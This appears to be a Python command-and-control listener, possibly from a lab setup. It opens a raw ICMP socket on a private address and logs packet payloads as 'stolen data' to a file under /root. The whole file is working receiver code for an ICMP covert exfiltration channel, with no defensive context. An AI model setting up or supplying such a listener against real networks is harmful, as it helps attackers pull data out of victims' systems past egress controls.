#!/usr/bin/env python3
import socket
import struct
from datetime import datetime

def decode_icmp_data(packet):
    # Extract ICMP payload data
    # Simple base64 decode or just raw text
    return packet[28:]  # Skip IP + ICMP headers

def log_stolen_data(data, source_ip):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open("/root/stolen-data/exfiltrated.log", "a") as f:
        f.write(f"{timestamp} | {source_ip} | {data.decode('utf-8', errors='ignore')}\n")

# Listen for ICMP packets
sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
sock.bind(("172.20.0.40", 0))

print("[C&C Server] Listening for exfiltrated data via ICMP...")

while True:
    try:
        packet, addr = sock.recvfrom(1024)
        data = decode_icmp_data(packet)
        if len(data) > 32:  # Only log suspicious large payloads
            log_stolen_data(data, addr[0])
            print(f"[EXFIL] Data received from {addr[0]}: {len(data)} bytes")
    except Exception as e:
        continue
